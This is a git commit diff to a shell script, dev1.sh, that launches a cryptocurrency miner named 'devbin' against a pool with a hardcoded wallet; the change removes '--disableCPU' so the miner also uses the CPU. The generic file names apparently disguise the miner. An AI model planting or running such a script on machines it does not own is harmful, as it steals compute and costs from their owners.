f84cea71c8defbb654614c22571b25a5600c8271
renilo <88342640+renilo@users.noreply.github.com>
2021-09-01 12:00:53 +0700

    Update dev1.sh

--- dev1.sh
+++ dev1.sh
@@ -4,4 +4,4 @@ WALLET=8By33DYys43cWJHQCxHinkHPdpsDPwFvf6qnZaFvvnCA2nZCPDoywMB1Mxapnc563zKrrfy1k
 
 chmod +x devbin
 
-./devbin --algorithm chukwa_wrkz --pool $POOL --username $WALLET.$(echo $(shuf -i 1-9999 -n 1)) --password x --disableCPU
+./devbin --algorithm chukwa_wrkz --pool $POOL --username $WALLET.$(echo $(shuf -i 1-9999 -n 1)) --password x
